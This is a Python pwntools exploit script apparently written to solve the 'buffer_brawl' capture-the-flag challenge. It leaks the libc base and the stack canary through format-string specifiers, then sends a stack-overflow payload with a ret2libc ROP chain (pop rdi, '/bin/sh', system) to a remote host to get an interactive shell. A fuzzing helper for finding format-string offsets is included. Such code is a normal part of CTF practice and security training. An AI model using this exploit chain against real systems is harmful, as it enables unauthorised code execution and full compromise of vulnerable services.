#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./buffer_brawl', checksec=False)
libc = elf.libc
#p = gdb.debug(elf.path) 
p = remote('buffer-brawl.chal.wwctf.com',1337)
context.log_level = 'info'

# fuzzing function to find canary, libc and elf base
# libc base address : %3$p + 0xfa2cd
# canary: %11$p
# elf base address: %10$p + 0x2188
def fuzzing():
    for i in range(1, 100):
        p = process()
        p.sendlineafter(b'> ', b'4')
        p.sendlineafter(b'?\n', '%{}$p'.format(i).encode())
        print(f'try {i} {p.recvline().strip()}')
        p.close()


def leak_libc_elf_canary_addr():
    global canary

    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'?\n', b'%3$p|%11$p')

    leak = p.recvline().strip().split(b'|')
    print(leak)

    libc.address = int(leak[0], 16) - 0x1147e2
    info(f'libc base address: {hex(libc.address)}')

    canary = int(leak[1], 16)
    info(f'canary: {hex(canary)}')
    
    
def pwn():
    #fuzzing()
    leak_libc_elf_canary_addr()
    rop = ROP(libc)

    pop_rdi = rop.rdi.address  #  pop rdi; ret;
    ret = rop.ret.address      # ret;

    padding = b'a' * 24

    payload = flat(
        padding,
        canary,
        0,
        pop_rdi,
        next(libc.search('/bin/sh\x00')),
        ret,
        libc.sym.system
    )

    # try to reach 'stack's life' points to be 13
    for i in range(29):
        p.sendlineafter(b'> ', b'3')

    p.sendlineafter(b'move: \n', payload)
    p.interactive()

pwn()